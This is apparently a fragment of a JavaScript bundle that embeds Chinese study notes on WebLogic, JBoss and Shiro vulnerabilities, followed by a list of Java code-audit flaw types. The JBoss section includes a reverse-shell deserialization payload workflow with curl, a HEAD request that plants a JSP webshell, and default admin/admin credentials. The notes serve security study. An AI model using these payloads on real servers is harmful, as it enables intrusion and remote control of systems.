              \u9ED8\u8BA4\u540E\u53F0\u5730\u5740\uFF1Ahttp://localhost:7001/console/login/loginForm.jsp

          \u6F0F\u6D1E\u5371\u5BB3
              \u53EF\u4E0A\u4F20\u6076\u610F\u6728\u9A6C\u6587\u4EF6\uFF0C\u63A7\u5236\u670D\u52A1\u5668

          \u6F0F\u6D1E\u4FEE\u590D
              \u5220\u9664\u8FDC\u7A0B\u90E8\u7F72\u9875\u9762

      XMLDecoder \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08CVE-2017-10271 & CVE-2017-3506\uFF09

      Weblogic wls9_async_response,wls-wsat \u53CD\u5E8F\u5217\u5316\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2019-2725\uFF09

      Weblogic WLS Core Components \u53CD\u5E8F\u5217\u5316\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2018-2628\uFF09

      Weblogic \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF08CVE-2018-2894\uFF09

      Weblogic SSRF\u6F0F\u6D1E \uFF08CVE-2014-4210\uFF09

      Weblogic \u5F31\u53E3\u4EE4 && \u540E\u53F0getshell




  `),Object(u.c)("JBoss",`


      \u8D44\u6599\uFF1A
              \u5199\u7684\u5F88\u6F66\u8349\uFF1A
                      https://www.cxyzjd.com/article/qq1325928591/111868872
              \u770B\u4E0A\u53BB\u8FD8\u633A\u5168\u9762\u7684\uFF1A
                      https://www.kancloud.cn/noahs/src_hacker/2395040

      JavaDeserH2HC\u5DE5\u5177\uFF1A
              \u8D44\u6599\uFF1A
                      \u4ECB\u7ECD\u6587\u7AE0\uFF1A    http://cn-sec.com/archives/70707.html

              \u4ECB\u7ECD\uFF1A

              \u4E0B\u8F7D\u65B9\u5F0F\uFF1A
                      \u5B98\u65B9\u4ED3\u5E93\uFF1Ahttps://github.com/joaomatosf/JavaDeserH2HC
                      \u56FD\u5185\u4E0B\u8F7D\u5730\u5740\uFF1Ahttp://scan.javasec.cn/java/JavaDeserH2HC.zip

              \u4F7F\u7528\u65B9\u5F0F\uFF1A
                      1\u3001\u901A\u8FC7 Apache\u7684\u300A:commons-collections-3.2.1.jar\u300B\u5305\uFF0C\u751F\u6210ser\u6587\u4EF6
                              1\u3001\u7B2C\u4E00\u6B65\uFF0C\u7F16\u8BD1\u4E3Aclass\u6587\u4EF6\uFF1A
                                      javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
                              2\u3001\u7B2C\u4E8C\u6B65\uFF0C\u751F\u6210ser\u6587\u4EF6\u3002
                                      java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port   // \u53CD\u5F39shell\u7684IP\u548C\u7AEF\u53E3
                      2\u3001\u7136\u540E\uFF0C\u4F7F\u7528 CUrl\u5DE5\u5177 \u8BBF\u95EE\u63A5\u53E3\uFF0C\u5E76\u5728 \u8BF7\u6C42\u4F53\u4E2D \u643A\u5E26\u300ABinary\u4E8C\u8FDB\u5236\u6570\u636E\u300B\uFF1A
                               curl  http://<\u76EE\u6807IP>:<\u76EE\u6807\u7AEF\u53E3>/invoker/readonly  --data-binary  @ReverseShellCommonsCollectionsHashMap.ser




      JMX Console HtmlAdaptor Getshell\uFF08CVE-2006-5750\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u6B64\u6F0F\u6D1E\u5229\u7528\u539F\u7406\u548CCVE-2007-1036\u6F0F\u6D1E\u76F8\u540C\uFF0C
                              1\u3001\u552F\u4E00\u7684\u533A\u522B\u662FCVE-2006-5750\u6F0F\u6D1E\u5229\u7528methodIndex\u8FDB\u884Cstore()\u65B9\u6CD5\u7684\u8C03\u7528\u3002
                                      1\u3001\u5176\u4E2DmethodIndex\u662F\u901A\u8FC7\u65B9\u6CD5\u7684\u7F16\u53F7\u8FDB\u884C\u8C03\u7528\u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528

      JMX Console HtmlAdaptor Getshell\uFF08CVE-2007-1036\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Jboss 4.x \u4EE5\u4E0B

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u6B64\u6F0F\u6D1E\u4E3B\u8981\u662F\u7531\u4E8EJBoss\u4E2D \u300A/jmx-console/HtmlAdaptor\u300B \u8DEF\u5F84\u5BF9\u5916\u5F00\u653E\uFF0C\u5E76\u4E14\u6CA1\u6709\u4EFB\u4F55\u8EAB\u4EFD\u9A8C\u8BC1\u673A\u5236\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u8FDB\u2F0A\u5230jmx\u63A7\u5236\u53F0\uFF0C\u5E76\u5728\u5176\u4E2D\u6267\u2F8F\u4EFB\u4F55\u529F\u80FD\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u8BE5\u6F0F\u6D1E\u5229\u2F64\u7684\u662F\u540E\u53F0\u4E2D jboss.admin -> DeploymentFileRepository -> store()\u5229\u7528\u2F45\u6CD5\uFF0C
                              1\u3001\u901A\u8FC7\u5411\u56DB\u4E2A\u53C2\u6570\u4F20\u2F0A\u4FE1\u606F\uFF0C\u8FBE\u5230\u4E0A\u4F20shell\u7684\u2F6C\u7684\uFF0C
                                      1\u3001\u5176\u4E2D arg0 \u4F20\u2F0A\u7684\u662F\u90E8\u7F72\u7684war\u5305\u540D\u5B57\uFF0C
                                      2\u3001arg1\u4F20\u2F0A\u7684\u662F\u4E0A\u4F20\u7684\u2F42\u4EF6\u7684\u2F42\u4EF6\u540D\uFF0C
                                      3\u3001arg2\u4F20\u2F0A\u7684\u662F\u4E0A\u4F20\u2F42\u4EF6\u7684\u2F42\u4EF6\u683C\u5F0F\uFF0C
                                      4\u3001arg3\u4F20\u2F0A\u7684\u662F\u4E0A\u4F20\u2F42\u4EF6\u4E2D\u7684\u5185\u5BB9\u3002
                              2\u3001\u901A\u8FC7\u63A7\u5236\u8FD9\u56DB\u4E2A\u53C2\u6570\u5373\u53EF\u4E0A\u4F20 shell \uFF0C\u63A7\u5236\u6574\u53F0\u670D\u52A1\u5668\u3002

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u8F93\u2F0AUrl\uFF1A
                              http://<\u76EE\u6807IP>:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository
                      2\u3001\u7136\u540E\uFF0C\u5B9A\u4F4D\u5230 \u7F51\u9875\u7684 store() \u65B9\u6CD5\uFF1A
                              1\u3001\u5728Form\u8868\u5355\u4E2D\uFF0C\u624B\u52A8\u586B\u5165 4\u4E2A\u53C2\u6570 \uFF0C\u5373\u53EF\u4E0A\u4F20 Shell \u6587\u4EF6\u3002


      JMX Console\u63A7\u5236\u53F0 \u5B89\u5168\u9A8C\u8BC1\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2010-0738\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      jboss4.2.0\u3001jboss 4.3.0
              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u8BE5\u6F0F\u6D1E\u5229\u2F64\u2F45\u6CD5\u8DDFCVE-2007-1036\u2F00\u6837\uFF0C\u53EA\u662F\u7ED5\u8FC7\u4E86 get\u65B9\u6CD5 \u548C post\u65B9\u6CD5 \u4F20\u8F93\u9650\u5236\uFF0C\u2F64 head\u65B9\u6CD5 \u4F20\u8F93\u2F45\u5F0F\u53D1\u9001payload\u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u5229\u2F64 Head\u8BF7\u6C42\u65B9\u6CD5 \u7684\u4F20\u8F93\u2F45\u5F0F\uFF0Cpayload\u5982\u4E0B\uFF1A
                              HEAD /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin:service=DeploymentFileRepository
                                      &methodIndex=6
                                      &arg0=../jmx-console.war/
                                      &arg1=hax0rwin
                                      &arg2=.jsp
                                      &arg3=<%Runtime.getRuntime().exec(request.getParameter("i"));%>
                                      &arg4=True

      JBoss EJBInvokerServlet \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08CVE-2013-4810\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      \u5B9E\u9645\u4E0A\u4E3B\u8981\u96C6\u4E2D\u5728 jboss 6.x \u7248\u672C\u4E0A
                              Apache Group Commons Collections 4.0
                              Apache Group Commons Collections 3.2.1
                              Apache Group Commons Collections

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u6B64\u6F0F\u6D1E\u548CCVE-2015-7501\u6F0F\u6D1E\u539F\u7406\u76F8\u540C\u3002
                      2\u3001\u4E24\u79CD\u4E0D\u540C\u5229\u7528\u65B9\u5F0F\u7684\u533A\u522B\uFF1A
                              1\u3001\u5C31\u5728\u4E8E\u4E24\u4E2A\u9009\u62E9\u7684\u5165\u53E3\u4E0D\u540C\uFF1A
                                      1\u3001\u5176\u4E2D JMXInvokerServlet \u548C EJBInvokerServlet \u5229\u7528\u7684\u662F org.jboss.invocation.MarshalledValue \u8FDB\u884C\u7684\u53CD\u5E8F\u5217\u5316\u64CD\u4F5C\uFF0C
                                      2\u3001\u800C web-console/Invoker \u5229\u7528\u7684\u662F org.jboss.console.remote.RemoteMBeanInvocation \u8FDB\u884C\u53CD\u5E8F\u5217\u5316\u5E76\u4E0A\u4F20\u6784\u9020\u7684\u6587\u4EF6\u3002
                              2\u3001\u8DEF\u5F84\u7684\u4E0D\u540C\uFF1A
                                      1\u3001\u8FD9\u4E2A\u6F0F\u6D1E\uFF08CVE-2013-4810\uFF09\uFF0C\u5229\u2F64\u8DEF\u5F84\u662F /invoker/EJBInvokerServlet \u3002
                                      2\u3001\u800C\uFF08CVE-2015-7501\uFF09\uFF0C\u5229\u7528\u8DEF\u5F84\u662F /invoker/JMXInvokerServlet \u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528

      JBoss JMXInvokerServlet \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08CVE-2015-7501\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      \u5B9E\u9645\u4E0A\u4E3B\u8981\u96C6\u4E2D\u5728 jboss 6.x \u7248\u672C\u4E0A:
                              Apache Group Commons Collections 4.0
                              Apache Group Commons Collections 3.2.1
                              Apache Group Commons Collections
              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u8FD9\u662F\u7ECF\u5178\u7684 JBoss \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001JBoss\u5728 /invoker/JMXInvokerServlet \u8BF7\u6C42\u4E2D\u8BFB\u53D6\u4E86\u7528\u6237\u4F20\u5165\u7684\u5BF9\u8C61\uFF0C
                              1\u3001\u7136\u540E\u6211\u4EEC\u53EF\u4EE5\u5229\u7528 Apache Commons Collections \u4E2D\u7684 Gadget \u6267\u884C\u4EFB\u610F\u4EE3\u7801\u3002
                                      1\u3001\u7531\u4E8EJBoss\u4E2D /invoker/JMXInvokerServlet \u8DEF\u5F84\u5BF9\u5916\u5F00\u653E\uFF0CJBoss\u7684jmx\u7EC4\u4EF6\u2F40\u6301Java\u53CD\u5E8F\u5217\u5316

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u63A2\u6D4B\u65B9\u6CD5\uFF1A
                              1\u3001\u6B64\u6F0F\u6D1E\u5B58\u5728\u4E8EJBoss\u4E2D /invoker/JMXInvokerServlet \u8DEF\u5F84\u3002\u8BBF\u95EE\u82E5\u63D0\u793A\u4E0B\u8F7D JMXInvokerServlet\uFF0C\u5219\u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\u3002
                      2\u3001\u653B\u51FB\u6D41\u7A0B\uFF1A
                              1\uFF1A\u4E0B\u9762\u4F7F\u7528 JavaDeserH2HC \u751F\u6210\u53CD\u5F39 shell \u7684 payload
                              2\uFF1A\u8FDB\u884C\u6587\u4EF6\u7F16\u8BD1
                                      1\u3001\u751F\u6210\u8F7D\u8377\u7684\u5E8F\u5217\u5316\u6587\u4EF6xx.ser(\u53CD\u5F39shell\u5230\u6211\u4EEC\u7684 VPS\u670D\u52A1\u5668 )
                                      2\u3001\u5229\u7528 curl \u63D0\u4EA4\u6211\u4EEC\u7684ser\u6587\u4EF6\u3002
                              3\uFF1Avps\u670D\u52A1\u5668 \u4F7F\u7528 nc \u76D1\u542C\u7AEF\u53E3\u6210\u529F\u53CD\u5F39\u3002


      JBossMQ JMS \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08CVE-2017-7504\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      JBoss AS 4.x\uFF0C\u53CA\u4E4B\u524D\u7248\u672C

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001JBoss AS 4.x\u53CA\u4E4B\u524D\u7248\u672C\u4E2D\uFF0CJbossMQ\u5B9E\u73B0\u8FC7\u7A0B\u7684JMS over HTTP Invocation Layer\u7684HTTPServerILServlet.java\u2F42\u4EF6\u5B58\u5728\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF0C
                              1\u3001\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u501F\u52A9\u7279\u5236\u7684\u5E8F\u5217\u5316\u6570\u636E\u5229\u2F64\u8BE5\u6F0F\u6D1E\u6267\u2F8F\u4EFB\u610F\u4EE3\u7801\u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u9996\u5148\u9A8C\u8BC1\u76EE\u6807jboss\u662F\u5426\u5B58\u5728\u6B64\u6F0F\u6D1E,\u76F4\u63A5\u8BBF\u95EE /jbossmq-httpil/HTTPServerILServlet \u8DEF\u5F84\u4E0B\u3002\u82E5\u8BBF\u95EE200\uFF0C\u5219\u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\u3002
                      2\u3001\u7136\u540E\uFF0C\u4F7F\u7528\u5DE5\u5177\uFF1A
                              1\u3001\u6B64\u5904\u6211\u4EEC\u4F7F\u7528 JavaDeserH2HC \u5DE5\u5177\u6765\u5229\u7528\u8BE5\u6F0F\u6D1E,\u5C1D\u8BD5\u76F4\u63A5\u5F39\u56DE\u4E00\u4E2Ashell\u3002

      JBoss \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E 5.x 6.x \u7248\u672C\uFF08CVE-2017-12149\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      JbossAS 5.x
                      JbossAS 6.x
              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u8BE5\u6F0F\u6D1E\u4E3A Java\u53CD\u5E8F\u5217\u5316\u9519\u8BEF\u7C7B\u578B\uFF0C\u5B58\u5728\u4E8E Jboss \u7684 HttpInvoker \u7EC4\u4EF6\u4E2D\u7684 ReadOnlyAccessFilter \u8FC7\u6EE4\u5668\u4E2D\u3002
                              1\u3001\u8BE5\u8FC7\u6EE4\u5668\u5728\u6CA1\u6709\u8FDB\u884C\u4EFB\u4F55\u5B89\u5168\u68C0\u67E5\u7684\u60C5\u51B5\u4E0B\u5C1D\u8BD5\u5C06\u6765\u81EA\u5BA2\u6237\u7AEF\u7684\u6570\u636E\u6D41\u8FDB\u884C\u53CD\u5E8F\u5217\u5316\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4E86\u6F0F\u6D1E\u3002
                              2\u3001\u8BE5\u6F0F\u6D1E\u51FA\u73B0\u5728**/invoker/readonly**\u8BF7\u6C42\u4E2D\uFF0C\u670D\u52A1\u5668\u5C06\u7528\u6237\u63D0\u4EA4\u7684POST\u5185\u5BB9\u8FDB\u884C\u4E86Java\u53CD\u5E8F\u5217\u5316,\u5BFC\u81F4\u4F20\u5165\u7684\u643A\u5E26\u6076\u610F\u4EE3\u7801\u7684\u5E8F\u5217\u5316\u6570\u636E\u6267\u884C\u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u9A8C\u8BC1POC\uFF1A
                              1\u3001\u8BBF\u95EEUrl\uFF1A        http://\u76EE\u6807:8080/invoker/readonly
                                      1\u3001\u5982\u679C\u51FA\u73B0\u62A5 500 \u9519\u8BEF,\u5219\u8BF4\u660E\u76EE\u6807\u673A\u5668\u53EF\u80FD\u5B58\u5728\u6B64\u6F0F\u6D1E
                              2\u3001\u8FD8\u53EF\u4EE5\u5229\u7528\u73B0\u6210\u5DE5\u5177\uFF1A
                                      \u300ACVE-2017-12149 jboss\u53CD\u5E8F\u5217\u5316v1.0\u300B\u63A2\u6D4B\u3002
                      2\u3001\u653B\u51FB\u5229\u7528\uFF1A
                              1\u3001\u7136\u540E\u4F7F\u7528 JavaDeserH2HC \u5B8C\u6210\u5229\u7528\u8FC7\u7A0B\u3002

      Administration Console \u5F31\u53E3\u4EE4
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      \u5168\u7248\u672C

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790
                      1\u3001Administration Console\u7BA1\u7406\u9875\u9762\u5B58\u5728\u5F31\u53E3\u4EE4\uFF0C\u767B\u5F55\u540E\u53F0\u53EF\u4EE5\u4E0A\u4F20war\u5305

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001admin/admin\u5F31\u53E3\u4EE4\u767B\u5F55,\u70B9\u51FB add a new resource \u4E0A\u4F20war\u5305
                      2\u3001\u70B9\u51FBwar\u5305\u8FDB\u5165\u4E0B\u4E00\u5C42\uFF0C\u82E5\u72B6\u6001\u4E3Astop\uFF0C\u5219\u70B9\u51FBstart\uFF0C\u9ED8\u8BA4\u90FD\u662Fstart\uFF0C\u4E0D\u9700\u8981\u70B9\u3002


      JMX Console\u672A\u6388\u6743\u8BBF\u95EE 4.x
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Jboss4.x \u4EE5\u4E0B\u7248\u672C\u3002

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001Jboss 4.x \u7684\u300A/jmx-console/\u300B \u540E\u53F0\u5B58\u5728\u672A\u6388\u6743\u8BBF\u95EE
                              1\u3001\u8FDB\u5165\u540E\u53F0\u540E\uFF0C\u53EF\u76F4\u63A5\u90E8\u7F72 war \u5305Getshell\u3002
                              2\u3001\u82E5\u9700\u767B\u5F55\uFF0C\u53EF\u4EE5\u5C1D\u8BD5\u7206\u7834\u5F31\u53E3\u4EE4\u767B\u5F55
                                      \uFF08\u7C7B\u4F3C\u4E8E Tomcat \u7684War\u5305\u914D\u7F6E\u6F0F\u6D1E\uFF09

      Jboss 5.x/6.x admin-Console\u540E\u53F0    \u90E8\u7F72war\u5305Getshell
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Jboss 5.x
                      Jboss 6.x

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001Jboss5.X\u5F00\u59CB\uFF0Cjmx-console\u4E0D\u80FD\u90E8\u7F72war\u5305\u4E86\uFF0C\u9700\u8981admin-console\u540E\u53F0\u90E8\u7F72

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u767B\u5F55\u8FDBadmin-console\u540E\u53F0\u540E\uFF0C
                          1\u3001\u70B9\u51FBWeb Application(WAR)s
                              1\u3001\u7136\u540EAdd a new resource
                              2\u3001\u8FD9\u91CC\u9009\u62E9\u6211\u4EEC\u672C\u5730\u751F\u6210\u597D\u7684war\u5305
                              3\u3001\u4E0A\u4F20\u540E\u8BBF\u95EE\u6211\u4EEC\u7684\u9A6C
                                      1\u3001http://xx.xx.xx.xx:8080/test/test.jsp?pwd=123&cmd=ls


      JBoss\u8FDC\u7A0B\u90E8\u7F72\u6F0F\u6D1E
              \u6F0F\u6D1E\u63CF\u8FF0
                      JBoss\u4E00\u4E2A\u57FA\u4E8EJavaEE\u7684\u5E94\u7528\u670D\u52A1\u5668\uFF0C\u4E0Etomcat\u7C7B\u4F3C\u7684\u662Fjboss\u4E5F\u6709\u8FDC\u7A0B\u90E8\u7F72\u5E73\u53F0\uFF0C\u4F46\u4E0D\u9700\u8981\u767B\u5F55

              \u6F0F\u6D1E\u9A8C\u8BC1
                      \u5C1D\u8BD5\u8BBF\u95EEhttp://localhost:8080\u56E0\u4E3A\u4E00\u822C\u7BA1\u7406\u540E\u53F0\u4E3A8080\u7AEF\u53E3

              \u6F0F\u6D1E\u5371\u5BB3
                      \u4E0A\u4F20\u6076\u610F\u6728\u9A6C\u6587\u4EF6\uFF0C\u63A7\u5236\u670D\u52A1\u5668

              \u6F0F\u6D1E\u4FEE\u590D
                      \u5F00\u542Fjmx-console\u5BC6\u7801\u8BA4\u8BC1
                      \u5220\u9664jmx-console.war\u4E0Eweb-console.war

      `),Object(u.c)("Jetty\u2014\u2014\u2014\u2014\u8FD8\u6CA1\u505A\u5B8C\u8FD8\u6CA1\u505A\u5B8C\u8FD8\u6CA1\u505A\u5B8C",`

      1

      `),Object(u.c)("Shiro",`

  Shiro
      \u8D44\u6599\uFF1A
              \u53EF\u80FD\u662F\u6700\u5168\u7684\uFF1A
                      https://xz.aliyun.com/t/11633
                      https://javasec.org/java-vuls/shiro/Shiro-5.html

              \u4E00\u4E2A\u8BB2 550\u3001721 \u8FD9\u4E24\u4E2A\u6D1E\uFF0C\u6BD4\u8F83\u8BE6\u7EC6\u7684\uFF1Ahttps://www.cnblogs.com/xiaozi/p/13239046.html
              \u4ECB\u7ECD\u4E86\u53E6\u5916\u4E00\u4E2A\u6D1E\uFF1Ahttps://www.freebuf.com/vuls/274305.html
              \u6DFB\u52A0\u4E86\uFF0C\u4E24\u4E2A\u7C7B\u4F3C\u7684\u5C0F\u6D1E\uFF1Ahttps://www.freebuf.com/vuls/283810.html

              \u8FD8\u6CA1\u770B\u5B8C\uFF1A
                      Shiro\u6388\u6743\u8FC7\u7A0B\u8BE6\u89E3\uFF1Ahttps://www.anquanke.com/post/id/263331

      \u57FA\u672C\u4ECB\u7ECD\uFF1A
              1\u3001Apache Shiro\u662F\u4E00\u4E2A\u5F3A\u5927\u4E14\u6613\u7528\u7684Java\u5B89\u5168\u6846\u67B6\uFF0C\u7528\u4E8E\u8EAB\u4EFD\u9A8C\u8BC1\u3001\u6388\u6743\u3001\u5BC6\u7801\u548C\u4F1A\u8BDD\u7BA1\u7406\u3002\u5177\u6709\u4EE5\u4E0B\u7279\u70B9\uFF1A
                      \u6613\u4E8E\u4F7F\u7528
                      \u5168\u9762
                      \u7075\u6D3B
                      Web\u652F\u6301
                      \u4F4E\u8026\u5408
                      \u88AB\u5E7F\u6CDB\u652F\u6301
              2\u3001\u4F46\u81EA\u8EAB\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u3002


      \u662F\u5426\u590D\u73B0\u8FC7\uFF1F\u539F\u7406\u662F\u4EC0\u4E48\uFF1F
          \u590D\u73B0\u8FC7\uFF0C\u539F\u7406\uFF1A
              1. \u5F53\u7528\u6237\u52FE\u9009RememberMe\u5E76\u767B\u5F55\u6210\u529F\uFF0CShiro\u4F1A\u5C06\u7528\u6237\u7684cookie\u503C\u5E8F\u5217\u5316\uFF0CAES\u52A0\u5BC6\uFF0C
              2. \u63A5\u7740base64\u7F16\u7801\u540E\u5B58\u50A8\u5728cookie\u7684rememberMe\u5B57\u6BB5\u4E2D\uFF0C\u670D\u52A1\u7AEF\u6536\u5230\u767B\u5F55\u8BF7\u6C42\u540E\uFF0C\u4F1A\u5BF9rememberMe\u7684cookie\u503C\u8FDB\u884Cbase64\u89E3\u7801\uFF0C
                  \u63A5\u7740\u8FDB\u884CAES\u89E3\u5BC6\uFF0C\u7136\u540E\u53CD\u5E8F\u5217\u5316\u3002
              3. \u7531\u4E8EAES\u52A0\u5BC6\u662F\u5BF9\u79F0\u5F0F\u52A0\u5BC6\uFF08key\u65E2\u80FD\u52A0\u5BC6\u6570\u636E\u4E5F\u80FD\u89E3\u5BC6\u6570\u636E\uFF09\uFF0C\u6240\u4EE5\u5F53\u653B\u51FB\u8005\u77E5\u9053\u4E86AES key\u540E\uFF0C\u5C31\u80FD\u591F\u6784\u9020\u6076\u610F\u7684rememberMe cookie\u503C\u4ECE\u800C\u89E6\u53D1\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3002

      \u76F8\u5173\u5229\u7528\u5DE5\u5177\u6709\u54EA\u4E9B\uFF1F
          \u6709 550\u7248\u3001721\u7248\u3002\u5171\u4E24\u4E2A\u7248\u672C\u5DE5\u5177\u3002


  `,{otherCps:v.a.createElement(v.a.Fragment,null,pu)}))]),\u6F0F\u6D1E\u7BC7:G([Object(u.a)(B||(B=Object(t.a)([`
  \u3010\u81EA\u5DF1\u3011\u3001\u3010\u81EA\u5DF1\u6316\u5230\u3011
  \u3010\u7ECF\u5178\u3011\u3010\u6F0F\u6D1E\u3011\u3010\u7ECF\u5178\u6F0F\u6D1E\u3011

  \u3010\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\u3011\u3001\u3010\u7ADE\u6001\u6F0F\u6D1E\u3011\u3001\u3010\u6587\u4EF6\u4E0A\u4F20\u3011\u3001\u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u3001\u3010XSS\u3011\u3001\u3010XML\u6CE8\u5165\u3011\u3001
  \u3010\u786C\u7F16\u7801\u3011\u3001\u3010\u4E34\u65F6\u6587\u4EF6\u5220\u9664\u3011\u3001\u3010\u4E0D\u5B89\u5168\u7684\u53CD\u5C04\u3011\u3001\u3010\u4F7F\u7528\u4E86\u4E0D\u5B89\u5168\u7684\u7EC4\u4EF6\u3011\u3001\u3010SQL\u6CE8\u5165\u3011\u3001
      \u3010XXE\u3011\u3001\u3010\u547D\u4EE4\u6267\u884C\u3011\u3001\u3010SSRF\u3011\u3001\u3010\u6587\u4EF6\u4E0A\u4F20\u3011\u3001\u3010URL\u91CD\u5B9A\u5411\u3011\u3001\u3010\u654F\u611F\u4FE1\u606F\u6CC4\u9732\u3011\u3001\u3010\u4EE3\u7801\u6267\u884C\u3011\u3001\u3010\u8868\u8FBE\u5F0F\u6267\u884C\u3011\u3001
  \u3010\u4EFB\u610F\u6587\u4EF6\u8BFB\u5199\u3011\u3001\u3010\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u3011\u3001\u3010\u4EFB\u610F\u6587\u4EF6\u590D\u5236\u3011\u3001\u3010\u4EFB\u610F\u6587\u4EF6\u79FB\u52A8\u3011\u3001\u3010\u4EFB\u610F\u6587\u4EF6\u904D\u5386\u3011\u3001

  Java\u4EE3\u7801\u5BA1\u8BA1\u53EF\u4EE5\u53D1\u73B0\u7684\u6F0F\u6D1E\u5206\u4E3A\u4E24\u7C7B\uFF1A

      1\u3001\u7A0B\u5E8F\u5458\u7531\u4E8E\u7F16\u7801\u4E0D\u5F53\u4EA7\u751F\u7684\u6F0F\u6D1E\uFF0C\u5178\u578B\u5305\u62EC\uFF1A
          \u6BD4\u5982\uFF1A
              \u540E\u95E8\u3001SQL\u6CE8\u5165\u3001
              \u6587\u4EF6\u4E0A\u4F20\u3001\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u3001
              \u63A5\u53E3\u975E\u6388\u6743\u8BBF\u95EE\u3001\u5782\u76F4\u8D8A\u6743\u3001\u6C34\u5E73\u8D8A\u6743

              XXE\u5916\u90E8\u5B9E\u4F53\u6F0F\u6D1E

          \u8FD8\u6709\uFF1A
              XSS\u3001CSRF
              \u903B\u8F91\u7C7B\u6F0F\u6D1E \uFF08\u5305\u62EC\u7ADE\u6001\u6F0F\u6D1E\uFF09

      2\u3001\u7B2C\u4E09\u65B9\u7EC4\u4EF6\u4F7F\u7528\u4E0D\u5F53\u4EA7\u751F\u7684\u6F0F\u6D1E\uFF0C\u4ECEPOM\u6587\u4EF6\u4E2D\u53EF\u4EE5\u627E\u5230\u4F7F\u7528\u4E86\u4F4E\u7248\u672C\u7684\u7EC4\u4EF6\u3002\u4ECE\u5E94\u7528\u914D\u7F6E\u6587\u4EF6\u4E2D\u53EF\u4EE5\u627E\u5230\u914D\u7F6E\u4E0D\u5F53\u95EE\u9898\u3002


  \u7ECF\u5178\u6F0F\u6D1E\uFF1A
      \u4EE5\u4E0B\uFF0C\u5747\u7B49\u5F85\u8865\u5145\uFF1A


      \u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\uFF08\u7ADE\u6001\u6F0F\u6D1E\uFF09`,`

      SQL\u6CE8\u5165`,`
      XSS / \u94FE\u63A5\u6CE8\u5165 / \u6846\u67B6\u6CE8\u5165`,`
      XML\u6CE8\u5165 / XXE\u6CE8\u5165`,`
      \u786C\u7F16\u7801`,`
      \u4E34\u65F6\u6587\u4EF6\u5220\u9664`,`
      \u4E0D\u5B89\u5168\u7684\u53CD\u5C04`,`
      \u4F7F\u7528\u4E86\u4E0D\u5B89\u5168\u7684\u7EC4\u4EF6`,`

      \u547D\u4EE4\u6267\u884C`,`
      SSRF`,`
      \u6587\u4EF6\u4E0A\u4F20`,`
